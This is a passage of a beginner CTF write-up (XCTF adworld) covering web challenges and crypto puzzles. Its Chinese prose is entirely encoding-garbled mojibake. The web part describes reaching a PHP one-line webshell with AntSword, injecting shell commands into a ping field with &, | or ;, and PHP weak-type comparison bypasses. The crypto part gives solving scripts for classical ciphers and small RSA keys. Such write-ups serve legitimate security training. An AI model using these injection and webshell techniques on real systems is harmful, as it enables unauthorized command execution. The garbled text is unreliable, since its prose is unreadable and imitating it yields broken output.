é™¤ï¼Œå¯ä»¥æ¢å¤åä½¿ç”¨\n æ­£å¦‚é¢˜ç›®æç¤ºï¼šphpä¸€å¥è¯â€”â€”å³phpä¸€å¥è¯æœ¨é©¬ï¼š https://my.oschina.net/programs/blog/1649544\näº†è§£ä¹‹åï¼Œæƒ³ç”¨burpsuiteçš„postè¯·æ±‚å‘é€ä¹Ÿæ²¡èƒ½è·å–æ•°æ®ï¼Œäºæ˜¯çœ‹äº†wpï¼Œç”¨ä¸­å›½èšå‰‘è¿äº†webshellï¼Œç„¶åç›´æ¥å‘ç°ç›®å½•åº•ä¸‹å°±æœ‰flag.txtã€‚\nåšå®Œä¹‹åï¼ŒæŸ¥çœ‹å®˜æ–¹wpï¼Œæˆ‘ä¹Ÿæ²¡å¼„æ‡‚ä»–wpæ€ä¹ˆç”¨burpsuiteå»postæ•°æ®æ¥è·å–webshellï¼ˆæˆ‘å›æ˜¾ä¸äº†æ•°æ®\nupdateï¼špostæ²¡æœ‰å›æ˜¾æ˜¯å› ä¸ºæˆ‘å°‘äº†åˆ†å·ï¼Œè¿˜æœ‰å°±æ˜¯hackbarçš„postæ²¡æœ‰å‘å‡ºå»ã€‚åé¢æˆåŠŸç”¨burpsuiteå‘é€postè¯·æ±‚ï¼ŒæˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚\n0x0b command execution  é¢˜ç›®æè¿°ï¼šå°å®å†™äº†ä¸ªpingåŠŸèƒ½,ä½†æ²¡æœ‰å†™waf,Xè€å¸ˆå‘Šè¯‰å¥¹è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—ã€‚\n è¿›å…¥é¡µé¢æœ‰ä¸ªè¾“å…¥æ¡†ï¼Œå°è¯•è¾“å…¥127.0.0.1å‘ç°èƒ½å¤Ÿpingé€šå¹¶æ˜¾ç¤ºå‘½ä»¤\näºæ˜¯è”æƒ³åˆ°å‘½ä»¤æ‹¼æ¥åˆ©ç”¨\u0026æˆ–|æˆ–ï¼›è®©æˆ‘ä»¬çš„å‘½ä»¤å’Œpingä¸€èµ·æ‰§è¡Œï¼Œå‘ç°flagåœ¨/home/flag.txté‡Œ\nç”¨findå‘½ä»¤çš„æ—¶å€™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨ä»–çš„shellé‡Œæœç´¢çš„æ—¶å€™è¦å¸¦å¼•å·ï¼Œå³find / -name \"flag*\"æ‰èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤å›æ˜¾ï¼Œå»æ‰å¼•å·å³å¤±è´¥äº†ã€‚\n0x0c simple php  é¢˜ç›®æè¿°ï¼šå°å®å¬è¯´phpæ˜¯æœ€å¥½çš„è¯­è¨€,äºæ˜¯å¥¹ç®€å•å­¦ä¹ ä¹‹åå†™äº†å‡ è¡Œphpä»£ç ã€‚\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  \u003c?php show_source(__FILE__); include(\"config.php\"); $a=@$_GET['a']; $b=@$_GET['b']; if($a==0 and $a){ echo $flag1; } if(is_numeric($b)){ exit(); } if($b\u003e1234){ echo $flag2; } ?\u003e  è¿›å…¥é¡µé¢ï¼Œè§åˆ°å¦‚ä¸Šphpä»£ç ï¼Œåº”è¯¥æ˜¯ä»£ç å®¡è®¡ã€‚\nå³è®©aæ»¡è¶³$a==0 and $aä¸”bæ»¡è¶³is_numeric($b)==flase\u0026$b\u003e1234å¾—åˆ°ä¸¤ä¸ªflag\n phpä¸­çš„å¼±ç±»å‹æ¯”è¾ƒä¼šä½¿'abc' == 0ä¸ºçœŸï¼Œæ‰€ä»¥è¾“å…¥a=abcæ—¶ï¼Œå¯å¾—åˆ°flag1ã€‚ï¼ˆabcå¯æ¢æˆä»»æ„å­—ç¬¦ï¼‰ã€‚\n  is_numeric() å‡½æ•°ä¼šåˆ¤æ–­å¦‚æœæ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSE,ä¸”phpä¸­å¼±ç±»å‹æ¯”è¾ƒæ—¶ï¼Œä¼šä½¿('1234a' == 1234)ä¸ºçœŸï¼Œæ‰€ä»¥å½“è¾“å…¥a=abc\u0026b=1235aï¼Œå¯å¾—åˆ°flag2ã€‚\n  å‘ç°â€œ0â€ä¸º trueï¼Œæ‰€ä»¥å¯ä»¥æŠŠå‚æ•° a æ„é€ ä¸ºâ€™0â€™æˆ–è€…â€˜alphâ€™è¿™ç§è½¬æ¢åä¸º 0 ä½†æœ¬èº«ä¸ä¸º False çš„ å½¢å¼ æ•°å­—å’Œå­—ç¬¦æ··åˆçš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•´æ•°ååªä¿ç•™æ•°å­—\n ","description":"","tags":["ctf","web"],"title":"XCTF-adworld-web-wp","uri":"/posts/xctf-adworld-web-wp/"},{"categories":["crypto"],"content":"Crypto\u0026WriteUp cryptoæ°¸è¿œå……æ»¡äº†googleå’Œå¸¸è¯†ï¼ˆè¿˜æœ‰å·¥å…·\næ”»é˜²ä¸–ç•Œ\u0026Cryptoæ–°æ‰‹ç»ƒä¹ åŒº 0x01 å¹‚æ•°åŠ å¯†  é¢˜ç›®æè¿°ï¼šä½ å’Œå°é±¼ç»ˆäºèµ°åˆ°äº†æœ€åçš„ä¸€ä¸ªè°œé¢˜æ‰€åœ¨çš„åœ°æ–¹ï¼Œä¸Šé¢å†™ç€ä¸€æ®µè¯â€œäº²çˆ±çš„æœ‹å‹ï¼Œ å¾ˆå¼€å¿ƒä½ å¯¹ç½‘ç»œå®‰å…¨æœ‰è¿™ä¹ˆå¤§çš„å…´è¶£ï¼Œå¸Œæœ›ä½ ä¸€ç›´åšæŒä¸‹å»ï¼Œä¸è¦æ”¾å¼ƒ ï¼Œå­¦åˆ°ä¸€äº›çŸ¥è¯†ï¼Œ èµ°è¿›å¹¿é˜”çš„å®‰å…¨å¤§ä¸–ç•Œâ€ï¼Œä½ å’Œå°é±¼æ¥è¿‡è°œé¢˜ï¼Œå¼€å§‹äº†è€å¿ƒç»†è‡´çš„è§£ç­”ã€‚flagä¸ºcyberpeace{ä½ è§£ç­”å‡ºçš„å…«ä½å¤§å†™å­—æ¯}\n ä¸‹è½½é™„ä»¶æ‰“å¼€æŸ¥çœ‹æ˜¯txtï¼Œé‡Œé¢æ”¾ä¸€æ®µæ•°å­—\n8842101220480224404014224202480122 ç”±ctf-wikiçš„å¸¸è¯†å¯çŸ¥ï¼Œè¿™æ˜¯01248åŠ å¯†ï¼Œå³ä»¥0ä¸ºåˆ†å‰²ï¼Œå°†å…¶ä¸­çš„æ•°åŠ èµ·æ¥å¯¹åº”å­—æ¯è¡¨çš„æ’ä½ã€‚\nè§£å¾—flag\n01248ï¼š 23 5 12 12 4 15 14 5 w e l l d o n e 0x02 base64  é¢˜ç›®æè¿°ï¼šå…ƒå®µèŠ‚ç¯è°œæ˜¯ä¸€ç§å¤è€çš„ä¼ ç»Ÿæ°‘é—´è§‚ç¯çŒœè°œçš„ä¹ ä¿—ã€‚ å› ä¸ºè°œè¯­èƒ½å¯è¿ªæ™ºæ…§åˆé¥¶æœ‰å…´è¶£ï¼Œç¯è°œå¢æ·»èŠ‚æ—¥æ°”æ°›ï¼Œæ˜¯ä¸€é¡¹å¾ˆæœ‰è¶£çš„æ´»åŠ¨ã€‚ ä½ ä¹Ÿå¾ˆå–œæ¬¢è¿™ä¸ªæ¸¸æˆï¼Œè¿™ä¸ï¼Œä»Šå¹´å…ƒå®µèŠ‚ï¼Œå¿ƒé‡Œæœ‰ä¸ªé»‘å®¢æ¢¦çš„ä½ ï¼Œçº¦ä¸Šä½ é’æ¢…ç«¹é©¬çš„å¥½ä¼™ä¼´å°é±¼ï¼Œ æ¥åˆ°äº†cyberpeaceçš„æ”»é˜²ä¸–ç•ŒçŒœè°œå¤§ä¼šï¼Œä¹Ÿæƒ³ç€ä¸€å±•èº«æ‰‹ã€‚ ä½ ä»¬ä¸€èµ·æ¥åˆ°äº†å°å­©å­å½å½å–³å–³åµåµé—¹é—¹çš„åœ°æ–¹ï¼Œä½ ä¿©æŠ¬å¤´ä¸€çœ‹ï¼Œä¸Šé¢çš„å¤§çº¢ç¯ç¬¼ä¸Šå†™ç€ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„ å­—ç¬¦ä¸²ï¼Œå°é±¼æ­£çº³é—·å‘¢ï¼Œä½ ç¥ç§˜ä¸€ç¬‘ï¼Œæˆ‘çŸ¥é“è¿™æ˜¯ä»€ä¹ˆäº†ã€‚\n æ‰“å¼€é™„ä»¶æ˜¯ä¸€æ®µè‹±æ–‡ï¼Œæœ‰é¢˜ç›®å¾—çŸ¥æ˜¯base64ç¼–ç ï¼Œè§£ç å¾—flag\nY3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9 cyberpeace{Welcome_to_new_World!} 0x03 Caesar  é¢˜ç›®æè¿°ï¼šä½ æˆåŠŸçš„è§£å‡ºäº†æ¥äº†ç¯è°œï¼Œå°é±¼ä¸€è„¸çš„æ„æƒ³ä¸åˆ°â€œæ²¡æƒ³åˆ°ä½ æ‡‚å¾—è¿™ä¹ˆå¤šå•Šï¼â€ ä½ å¿ƒé‡Œé¢æœ‰ç‚¹å°å¾—æ„ï¼Œâ€œé‚£å¯ä¸æ˜¯ï¼Œè®ºå­¦ä¹ æˆ‘æ²¡ä½ æˆç»©å¥½è½®åˆ«çš„æˆ‘çŸ¥é“çš„å¯ä¸æ¯”ä½ å°‘ï¼Œèµ°æˆ‘ä»¬å»çœ‹çœ‹ä¸‹ä¸€ä¸ªâ€ ä½ ä»¬ç»§ç»­èµ°ï¼Œçœ‹åˆ°å‰é¢ä¹Ÿæ˜¯çƒ­çƒ­é—¹é—¹çš„ï¼ŒåŒæ ·çš„å¤§çº¢ç¯ç¬¼é«˜é«˜æŒ‚èµ·ï¼Œæ—è¾¹å‘¢å¥½å¤šäººå½å½å–³å–³è¯´ä¸ªä¸åœã€‚ä½ ä¸€çœ‹ å¤§ç¯ç¬¼ï¼Œä¸Šé¢è¿˜æ˜¯ä¸€å¯¹å­—ç¬¦ï¼Œä½ æ­£å†¥æ€è‹¦æƒ³å‘¢ï¼Œå°é±¼ç¥ç§˜ä¸€ç¬‘ï¼Œå¯¹ä½ è¯´é“ï¼Œæˆ‘çŸ¥é“è¿™ä¸ªçš„ç­”æ¡ˆæ˜¯ä»€ä¹ˆäº†\n ç”±é¢˜ç›®å¾—çŸ¥æ˜¯å‡¯æ’’å¯†ç ï¼Œéšä¾¿ç™¾åº¦ä¸€ä¸ªå·¥å…·è¿›è¡Œæš´åŠ›ç ´è§£å¾—çŸ¥ï¼Œç§»ä½12ä½\nå¿«æ·ï¼šç®—å‡ºoå’Œcå¾—æ’å€¼ï¼Œä½†æ˜¯æˆ‘è§‰å¾—æ›´æ…¢\noknqdbqmoq{kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz} cyberpeace{you_have_learned_caesar_encryption} 0x04 Morse  é¢˜ç›®æè¿°ï¼šå°é±¼å¾—æ„çš„çŸäº†ä½ ä¸€çœ¼ï¼Œç¥ç¥æ°”æ°”çš„æ‹¿èµ°äº†ç­”å¯¹è°œè¯­çš„å¥–åŠ±ï¼Œä½ å¿ƒé‡Œæš—æš—è¾ƒåŠ² æƒ³ç€ä¸‹ä¸€ä¸ªè°œé¢˜ä¸€å®šè¦æ¯”å°é±¼æ›´å¿«çš„è§£å‡ºæ¥ã€‚ä¸çŸ¥ä¸è§‰ä½ ä»¬èµ°åˆ°äº†ä¸‹ä¸€ä¸ªè°œé¢˜çš„åœ°æ–¹ï¼Œè¿™ä¸ªåœ°æ–¹æœ‰äº›å¥‡æ€ªã€‚ ä¸Šé¢æ²¡ä»€ä¹ˆæç¤ºä¿¡æ¯ï¼Œåªæ˜¯åˆ»ç€ä¸€äº›0å’Œ1ï¼Œæ„Ÿè§‰æœ‰ç€ä¸€äº›å¥‡æ€ªçš„è§„å¾‹ï¼Œä½ è§‰å¾—æœ‰äº›ç†Ÿæ‚‰ï¼Œä½†æ˜¯å°±æ˜¯æƒ³ä¸èµ·æ¥ è¿™äº›01ä»£è¡¨ç€ä»€ä¹ˆæ„æ€ã€‚ä¸€æ—çš„å°é±¼çœ‹ä½ çœ‰å¤´ç´§é”çš„æ ·å­ï¼Œæ‰‘å“§ä¸€ç¬‘ï¼Œå¯¹ä½ è®²â€œä¸å¥½æ„æ€æˆ‘åˆçŒœåˆ°ç­”æ¡ˆäº†ã€‚â€(flagæ ¼å¼ä¸ºcyberpeace{xxxxxxxxxx},å‡ä¸ºå°å†™)\n ä¸‹è½½é™„ä»¶ï¼Œæ‰“å¼€æ–‡æ¡£æ˜¯ä¸€ä¸²01ä¸²\n11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110 å‡å¦‚æŒ‰1:=.\u00260:=-ç¿»è¯‘åˆ™ç¬¬ä¸€ä¸ªå­—æ¯å¯ç¿»è¯‘ï¼Œä½†æ˜¯åé¢æœ‰ä¸€ä¸ªå­—ç¬¦æ— æ³•ç¿»è¯‘\nå› æ­¤ï¼Œ01è°ƒæ¢é¡ºåº1:=-\u00260:=.\nåˆ©ç”¨pythonçš„str.replaceçš„åˆ°.-çš„morsecodeï¼Œæ‰¾ä¸ªåœ¨çº¿å·¥å…·ç›´æ¥ç¿»è¯‘å¾—åˆ°ç»“æœï¼Œéœ€è¦è‡ªå·±åŠ ä¸Šcyberpeace{}æ ¼å¼ï¼šcyberpeace{morsecodeissointeresting}\nmorsecodeissointeresting å¯æƒœæˆ‘åæ¥æ²¡æ³¨æ„åˆ°éœ€è¦å…¨éƒ¨å°å†™ï¼Œæµªè´¹äº†æ—¶é—´ã€‚\n0x05 Railfence  é¢˜ç›®æè¿°ï¼šè¢«å°é±¼ä¸€è¿å°†äº†ä¸¤å†›ï¼Œä½ å¿ƒé‡Œæ›´åŠ ä¸æœæ°”äº†ã€‚ä¸¤ä¸ªäººä¸€èµ·ç»§ç»­å¾€å‰èµ°ï¼Œ ä¸€è·¯ä¸Šæ‚è€å–è‰ºçš„å¾ˆå¤šï¼Œä½†æ˜¯ä½ ä¿©æ¯«æ— å…´è¶£ï¼Œç›´ç›´çš„å°±å†²ç€ä¸‹ä¸€ä¸ªè°œé¢˜çš„åœ°æ–¹å»äº†ã€‚ åˆ°äº†ä¸€çœ‹ï¼Œè¿™ä¸ªè°œé¢çœ‹èµ·æ¥å°±å·²ç»æœ‰ç‚¹åƒç­”æ¡ˆäº†æ ·å­äº†ï¼Œæ—è¾¹è¿˜ç”»ç€ä¸€å¼ ç”»ï¼Œæ˜¯ä¸€å‰¯å†œå®¶å°é™¢çš„ å›¾ç”»ï¼Œä¸Šé¢ç”»ç€ä¸€ä¸ªå†œå¦‡åœ¨æ …æ é‡Œé¢å–‚5åªå°é¸¡ï¼Œä½ å˜¿å˜¿ä¸€ç¬‘å¯¹ç€å°é±¼è¯´è¿™æ¬¡å¯æ˜¯æˆ‘å…ˆæ‰¾åˆ°ç­”æ¡ˆäº†ã€‚\n æ‰“å¼€é™„ä»¶æ˜¯ä¸€ä¸ªæ–‡æ¡£å¦‚ä¸‹ï¼Œå¦‚é¢˜ç›®æ˜æ˜¾çš„æ˜¯æ …æ åŠ å¯†ã€‚æ‰¾äº†ä¸ªåœ¨çº¿å·¥å…·ç ´è§£ã€‚\nccehgyaefnpeoobe{lcirg}epriec_ora_g ç»“æœå¸¸è§„æ …æ åŠ å¯†æ²¡è·‘å‡ºæ¥ï¼Œåœ¨çœ‹åˆ°é¢˜ç›®æœ‰ä¸€ä¸ªæ•°å­—5ç›²çŒœè¿™å¯èƒ½æ˜¯æ …æ åŠ å¯†çš„keyï¼Œä½†æ˜¯å¸¸è§„çš„æ˜¯è·‘ä¸å‡ºæ¥flagçš„ï¼Œåé¢çœ‹ç™¾ç§‘çŸ¥é“æœ‰ä¸ªæ˜¯wwwå‹æ …æ åŠ å¯†\nPS:WWWå‹çš„åŠ å¯†å¯†é’¥å°±ä¸åªèƒ½æ˜¯å­—ç¬¦ä¸²é•¿åº¦çš„å› å­ï¼Œå°äºå…¶é•¿åº¦çš„ä»»ä½•ä¸€ä¸ªæ•°éƒ½å¯èƒ½æ˜¯å…¶keyå€¼ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥ä¹Ÿæ˜¯ç¡®å®šå¯†é’¥ã€‚\nç”±é¢˜ç›®å¯çŸ¥keyå¯èƒ½æ˜¯5ï¼Œä¸€å°è¯•æœç„¶æ­£ç¡®ï¼Œå¾—åˆ°flagï¼šcyberpeace{railfence_cipher_gogogo}\né™„ä¸€ä¸ªwwwå‹æ …æ å¯†ç çš„ç½‘ç«™ï¼š http://www.atoolbox.net/Tool.php?Id=777\né™„èµ ä¸€ä¸ªæ …æ å¯†ç çš„è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  #!/usr/bin/env python3 #å¸¸è§çš„æ …æ è§£å¯† e = input('æ¸…è¾“å…¥è¦è§£å¯†çš„å­—ç¬¦ä¸²\\n') elen = len(e) # è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦ field = [] for i in range(2, elen): # åšä¸€ä¸ªå¾ªç¯ï¼Œä»2å¼€å§‹åˆ°æ•°å­—elenï¼ˆå­—ç¬¦ä¸²é•¿åº¦ï¼‰ if elen % i == 0: # è®¡ç®—é‚£äº›æ•°å­—èƒ½æ•´é™¤å­—ç¬¦ä¸²é•¿åº¦ field.append(i) # å°†èƒ½æ•´å‡ºçš„æ•°å­—åŠ å…¥åˆ°fieldé‡Œé¢ for f in field: b = elen // f # ç”¨å­—ç¬¦ä¸²å®é™…é•¿åº¦é™¤ä»¥ä¸Šé¢è®¡ç®—å‡ºèƒ½æ•´å‡ºçš„æ•°å­—f result = {x: '' for x in range(b)} for i in range(elen): # å­—ç¬¦ä¸²æœ‰å¤šå°‘ä½ï¼Œå°±å¾ªç¯å¤šå°‘æ¬¡ a = i % b result.update({a: result[a] + e[i]}) # å­—ç¬¦ä¸²æˆªæ–­ï¼Œå¹¶æ›´æ–°æ•°æ® d = '' for i in range(b): d += result[i] print('åˆ†ä¸º'+str(f)+'æ æ—¶ï¼Œè§£å¯†ç»“æœä¸ºï¼š'+d+'\\n') # è¾“å‡ºç»“æœï¼Œå¹¶å¼€å§‹ä¸‹ä¸€ä¸ªå¾ªç¯ #Wå‹åŠ å¯† string=input(\"è¾“å…¥è¦åŠ å¯†çš„å­—ç¬¦ä¸²\\n\") length = len(string) #çŒœæƒ³ä¸ä¼šæ˜¯ä¸€æ ,å’Œnæ ï¼ˆæ»‘ç¨½ï¼‰å› ä¸ºè¿™ä¸ªå°±æ˜¯åŸæ¥å­—ç¬¦ä¸²ï¼ˆç‹—å¤´ï¼‰ #é‚£ä¹ˆï¼Œå°±æš´åŠ›éå†ä¸€æ³¢å…¶ä¸­çš„é‚£äº›â‘§ for i in range(2,length): result={x:\"\"for x in range(i)} for a in range(length) : width=i*2-2 num=a%width if(num\u003ci): result.update({num:result[num]+string[a]}) else: ll=2*i-2-num result.update({ll:result[ll]+string[a]}) d='' for k in range(i): d=d+result[k] print(\"åˆ†ä¸º\"+str(i)+\"æ ,ç»“æœæ˜¯ï¼š\"+d)   0x06 è½¬è½®æœºåŠ å¯†  é¢˜ç›®æè¿°ï¼šä½ ä¿©ç»§ç»­å¾€å‰èµ°ï¼Œæ¥åˆ°äº†å‰é¢çš„ä¸‹ä¸€ä¸ªå…³å¡ï¼Œè¿™ä¸ªé“ºé¢å¢™ä¸Šå†™äº†å¥½å¤šå¥‡å¥‡æ€ªæ€ªçš„ è‹±æ–‡å­—æ¯ï¼Œæ’åˆ—çš„çš„æ•´æ•´é½é½ï¼Œåº—é¢å‰é¢è¿˜æœ‰ä¸€ä¸ªå¤§å¤§çš„ç±»ä¼¼äºåœŸè€³å…¶æ—‹è½¬çƒ¤è‚‰çš„æ¶å­ï¼Œä¸Šé¢ä¸€åœˆåœˆçš„ ä¹Ÿåˆ»ç€å¾ˆå¤šè‹±æ–‡å­—æ¯ï¼Œä½ æ˜¯ä¸€ä¸ªå°å†å²è¿·ï¼Œå¯¹äºäºŒæˆ˜æ—¶å€™çš„å†å²åˆšå¥½ç‰¹åˆ«ç†Ÿæ‚‰ï¼Œä¸€æ‹å¤§è…¿ï¼šâ€œå—¨å‘€ï¼æˆ‘çŸ¥é“ æ˜¯ä»€ä¹ˆä¸œè¥¿äº†ï¼â€ã€‚æç¤ºï¼šæ‰˜é©¬æ–¯Â·æ°æ–é€Š\n çœ‹é¢˜ç›®å¯çŸ¥æ˜¯è½¬è½®æœºç®—æ³•\né™„ä»¶å†…å®¹å¦‚ä¸‹ï¼š\n1: \u003c ZWAXJGDLUBVIQHKYPNTCRMOSFE \u003c 2: \u003c KPBELNACZDTRXMJQOYHGVSFUWI \u003c 3: \u003c BDMAIZVRNSJUWFHTEQGYXPLOCK \u003c 4: \u003c RPLNDVHGFCUKTEBSXQYIZMJWAO \u003c 5: \u003c IHFRLABEUOTSGJVDKCPMNZQWXY \u003c 6: \u003c AMKGHIWPNYCJBFZDRUSLOQXVET \u003c 7: \u003c GWTHSPYBXIZULVKMRAFDCEONJQ \u003c 8: \u003c NOZUTWDCVRJLXKISEFAPMYGHBQ \u003c 9: \u003c XPLTDSRFHENYVUBMCQWAOIKZGJ \u003c 10: \u003c UDNAJFBOWTGVRSCZQKELMXYIHP \u003c 11ï¼š \u003c MNBVCXZQWERTPOIUYALSKDJFHG \u003c 12ï¼š \u003c LVNCMXZPQOWEIURYTASBKJDFHG \u003c 13ï¼š \u003c JZQAWSXCDERFVBGTYHNUMKILOP \u003c å¯†é’¥ä¸ºï¼š 2,3,7,5,13,12,9,1,8,10,4,11,6 å¯†æ–‡ä¸ºï¼šNFQKSEVOQOFNP //TODOï¼šè¿˜éœ€è¦ææ¸…æ¥šè½¬è½®æœºç®—æ³•çš„åŸç†ï¼Œæœ‰ç‚¹æ··ä¹±ç°åœ¨\nå®˜æ–¹wpç»™å‡ºä»¥ä¸‹pythonè‡ªåŠ¨åŒ–è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import re sss='''1: \u003c ZWAXJGDLUBVIQHKYPNTCRMOSFE \u003c 2: \u003c KPBELNACZDTRXMJQOYHGVSFUWI \u003c 3: \u003c BDMAIZVRNSJUWFHTEQGYXPLOCK \u003c 4: \u003c RPLNDVHGFCUKTEBSXQYIZMJWAO \u003c 5: \u003c IHFRLABEUOTSGJVDKCPMNZQWXY \u003c 6: \u003c AMKGHIWPNYCJBFZDRUSLOQXVET \u003c 7: \u003c GWTHSPYBXIZULVKMRAFDCEONJQ \u003c 8: \u003c NOZUTWDCVRJLXKISEFAPMYGHBQ \u003c 9: \u003c XPLTDSRFHENYVUBMCQWAOIKZGJ \u003c 10: \u003c UDNAJFBOWTGVRSCZQKELMXYIHP \u003c 11 \u003c MNBVCXZQWERTPOIUYALSKDJFHG \u003c 12 \u003c LVNCMXZPQOWEIURYTASBKJDFHG \u003c 13 \u003c JZQAWSXCDERFVBGTYHNUMKILOP \u003c ''' m=\"NFQKSEVOQOFNP\" content=re.findall(r'\u003c (.*?) \u003c',sss,re.S) iv=[2,3,7,5,13,12,9,1,8,10,4,11,6] vvv=[] ans=\"\" for i in range(13): index=content[iv[i]-1].index(m[i]) vvv.append(index) for i in range(0,26): flag=\"\" for j in range(13): flag+=content[iv[j]-1][(vvv[j]+i)%26] print(flag)   0x07 easy RSA æ‰“å¼€é™„ä»¶æŸ¥çœ‹ã€‚\nåœ¨ä¸€æ¬¡RSAå¯†é’¥å¯¹ç”Ÿæˆä¸­ï¼Œå‡è®¾p=473398607161ï¼Œq=4511491ï¼Œe=17 æ±‚è§£å‡ºd fi=(p-1)(q-1) -------------------------------------------------------------- e*d=1 mod fi d=e^(fi(fi)-1) æ„Ÿè°¢èˆå‹çš„cppæ–‡ä»¶\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #include\u003ciostream\u003e#include\u003ccstdio\u003e#define ll long long ll gcd(ll a,ll b,ll\u0026aa,ll\u0026bb){ ll ab=0,ba=0;aa=1;bb=1; while(1){ if(a==0){aa=ba;return b;} ba-=(b/a)*aa;bb-=(b/a)*ab;b%=a; if(b==0){bb=ab;return a;} aa-=(a/b)*ba;ab-=(a/b)*bb;a%=b; } } ll mod_inverse(ll a,ll mod){ ll res,temp; ll d=gcd(a,mod,res,temp); if(d==1)return res; return -1; } int main(){ ll p,q,e,d; p = 473398607161; q = 4511491; e = 17; std::cout\u003c\u003cmod_inverse(e,(p-1)*(q-1))\u003c\u003cstd::endl; }   æ ¹æ®èˆå‹ç»™çš„rsaçš„cppæ–‡ä»¶æ”¹å‡ºçš„pythonè„šæœ¬ï¼Œä¸ä¼šçˆ†longlongå“¦ï¼ˆè™½ç„¶åŸé¢˜ä¹Ÿä¸ä¼šçˆ†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  def EX_GCD(a,b,arr): #æ‰©å±•æ¬§å‡ é‡Œå¾— if b == 0: arr[0] = 1 arr[1] = 0 return a g = EX_GCD(b, a % b, arr) t = arr[0] arr[0] = arr[1] arr[1] = t - int(a / b) * arr[1] return g def ModReverse(a,n): #ax=1(mod n) æ±‚aæ¨¡nçš„ä¹˜æ³•é€†x arr = [0,1,] gcd = EX_GCD(a,n,arr) if gcd == 1: return (arr[0] % n + n) % n else: return -1 ''' while True: a,b = eval(input()) print(ModReverse(a,b)) ''' if __name__=='__main__': while True: l = input(\"p,q,e:\") p,q,e = map(lambda x:int(x),l.split(\",\")) fn = (p-1)*(q-1) #print(l) d = ModReverse(e,fn) print(\"d=%d\"%d)   PSï¼šçœ‹å®˜æ–¹wpç»™å‡ºäº†ä¸€ä¸ªGitHubé¡¹ç›®åœ°å€ï¼šä¸€æ¬¾å¯ä»¥è§£rsaçš„å·¥å…· https://github.com/3summer/CTF-RSA-tool\n1  python solve.py --verbose --private -N 2135733555619387051 -e 17 -p 473398607161 -q 4511491   0x08 Normal_RSA  é¢˜ç›®æè¿°ï¼šä½ å’Œå°é±¼èµ°å•Šèµ°èµ°å•Šèµ°ï¼Œèµ°åˆ°ä¸‹ä¸€ä¸ªé¢˜ç›®ä¸€çœ‹ä½ åˆä¸€æ„£ï¼Œæ€ä¹ˆè¿˜æ˜¯ä¸€ä¸ªæ•°å­¦é¢˜å•Š å°é±¼åˆä¸€ç¬‘ï¼Œhhhhæ•°å­¦åœ¨å¯†ç å­¦é‡Œé¢å¾ˆé‡è¦çš„ï¼ç°åœ¨çŸ¥é“åƒäºäº†å§ï¼ä½ å“¼ä¸€å£°ä¸æœæ°”ï¼Œæˆ‘çŸ¥é“æ•°å­¦ å¾ˆé‡è¦äº†ï¼ä½†æ˜¯å·¥å…·ä¹Ÿå¾ˆé‡è¦çš„ï¼Œä½ çœ‹æˆ‘æ‹¿å·¥å…·æŠŠä»–è§£å‡ºæ¥ï¼ä½ æ‰“å¼€ç”µè„‘æŠ˜è…¾äº†ä¸€ä¼šè¿˜çœŸçš„æŠŠç­”æ¡ˆ åšäº†å‡ºæ¥ï¼Œå°é±¼æœ‰äº›åƒæƒŠï¼Œå‘ä½ æŠ•è¿‡æ¥ä¸€ä¸ªèµå¹çš„ç›®å…‰\n æœç„¶ï¼Œè§£rsaéƒ½æ˜¯éœ€è¦å·¥å…·çš„ï¼Œçœ‹å®Œå®˜æ–¹wpåï¼Œå‘ç°åªéœ€è¦ctf-rsa-toolsä¸€è¡Œä»£ç å°±èƒ½è·‘å‡ºflagæ¥ã€‚\nç”šè‡³è¿é¢˜ç›®ç»™çš„æ ·ä¾‹éƒ½æ˜¯äººå®¶exampleé‡Œçš„ï¼ˆè™½ç„¶æ˜¯æ‘˜è‡ªPCTFã€‚\n1  python solve.py --verbose -k examples/jarvis_oj_mediumRSA/pubkey.pem --decrypt examples/jarvis_oj_mediumRSA/flag.enc   ä¸è¿‡åœ¨çœ‹wpæ—¶ï¼Œå‘ç°æœ‰äººç»™äº†å¦ä¸€ç§å¸¸è§„è§£æ³•\nä»–çš„è§£é¢˜æ€è·¯è§£é¢˜æ€è·¯æ˜¯ï¼šâ‘ ä½¿ç”¨ openssl è§£å¯†.pem ä¸­å‚æ•° --\u003e â‘¡å‚æ•°åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶ --\u003e â‘¢ åˆ©ç”¨ factor å¯¹å¤§æ•´æ•°è¿›è¡Œåˆ†è§£ï¼Œå¾—åˆ° p å’Œ q --\u003e â‘£ç”¨ rsatool ç”Ÿæˆç§é’¥æ–‡ä»¶: private.pem --\u003e â‘¤ç”¨ private.pem è§£å¯† flag.enc\nå…¶ä¸­ç¬¬ä¸‰æ­¥factorç”¨åˆ°çš„ç½‘ç«™ä¸ºï¼šhttp://www.factordb.com/\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  #1 $openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem #2å°†å¾—åˆ°çš„modulusç”¨pythonè¿›è¡Œè½¬æ¢ $python \u003e\u003e\u003e 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD 87924348264132406875276140514499937145050893665602592992418171647042491658461 \u003e\u003e\u003e #3 è¿›å…¥ç½‘ç«™ http://www.factordb.com/ 